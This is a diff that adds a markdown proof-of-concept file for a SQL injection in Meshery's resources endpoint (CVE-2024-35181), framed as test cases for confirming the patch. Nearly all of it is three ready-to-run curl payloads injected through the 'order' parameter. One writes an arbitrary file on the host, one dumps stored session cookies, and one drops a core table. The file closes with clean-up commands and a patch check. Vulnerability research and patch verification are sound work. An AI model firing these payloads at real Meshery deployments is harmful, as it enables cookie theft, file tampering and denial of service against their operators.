@@ -1,0 +1,66 @@
+# PoC Test Cases — Meshery SQL-Injection (CVE-2024-35181)
+
+> **Setup prerequisites**  
+> * Meshery ≤ 0.7.21 running with default SQLite backend  
+> * Endpoint `/api/system/meshsync/resources/kinds` reachable  
+> * Attacker has network access (authentication optional in many deployments)
+
+---
+
+## Test Case 1 – Arbitrary File Write via `ATTACH DATABASE`
+
+**Objective**: create a new file on the Meshery host.
+
+```bash
+curl -s \
+  "http://MESHERY_HOST/api/system/meshsync/resources/kinds?order=foo;ATTACH%20DATABASE%20'/tmp/evil.db'%20AS%20pwn--"
+```
+
+*Expected result*  
+* `200 OK` response with JSON array (normal data)  
+* On disk, `/tmp/evil.db` now exists and is owned by the Meshery process.
+
+---
+
+## Test Case 2 – Data Exfiltration (Dump session cookies)
+
+**Objective**: extract values from the `performance_profiles` table, which stores cookies.
+
+```bash
+curl -s \
+  "http://MESHERY_HOST/api/system/meshsync/resources/kinds?order=foo;SELECT%20group_concat(request_cookies,'|')%20FROM%20performance_profiles--"
+```
+
+*Expected result*  
+* Meshery returns a JSON error or truncated payload that nonetheless contains concatenated cookie strings inside the response body (SQLite dumps appear after the legitimate JSON due to stacked queries).
+
+---
+
+## Test Case 3 – Denial-of-Service by Dropping a Core Table
+
+**Objective**: brick Meshery by removing an essential table.
+
+```bash
+curl -s \
+  "http://MESHERY_HOST/api/system/meshsync/resources/kinds?order=foo;DROP%20TABLE%20meshery_resource_metadata--"
+```
+
+*Expected result*  
+* Immediate `500 Internal Server Error` or similar.  
+* Subsequent Meshery API calls fail because the table `meshery_resource_metadata` no longer exists.
+
+---
+
+## Clean-up (optional, for lab use only)
+
+If you want to undo the damage in a test environment:
+
+```bash
+rm -f /tmp/evil.db
+# Restore from backup or recreate tables as needed:
+sqlite3 ~/.meshery/meshery.db < path/to/backup.sql
+```
+
+> **Patch confirmation:**  
+> After upgrading to Meshery ≥ 0.7.22 these requests should all return normally-sorted JSON because `order` is blanked out by `SanitizeOrderInput`, and no file is created, no rows are leaked, and no tables are dropped.
+```
